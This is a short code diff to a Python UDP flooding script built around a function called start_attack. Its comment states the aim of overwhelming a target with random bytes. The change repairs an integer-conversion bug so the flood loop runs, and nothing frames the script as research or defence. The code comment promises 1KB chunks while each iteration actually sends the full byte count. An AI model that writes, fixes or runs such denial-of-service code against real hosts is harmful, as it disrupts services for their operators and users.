@@ -43,7 +43,7 @@ def start_attack():
         s.sendto(payload.encode(), (target_ip, int(target_port)))
     # Send a large number of random bytes multiple times to overwhelm the target
         for _ in range(int(num_bytes) // 1024):  # Send in chunks of 1KB
-            s.sendto(os.urandom(num_bytes), (target_ip, int(target_port)))
+            s.sendto(os.urandom(int(num_bytes)), (target_ip, int(target_port)))
         remaining_bytes = int(num_bytes) % 1024
         if remaining_bytes > 0:
             s.sendto(os.urandom(remaining_bytes), (target_ip, int(target_port)))
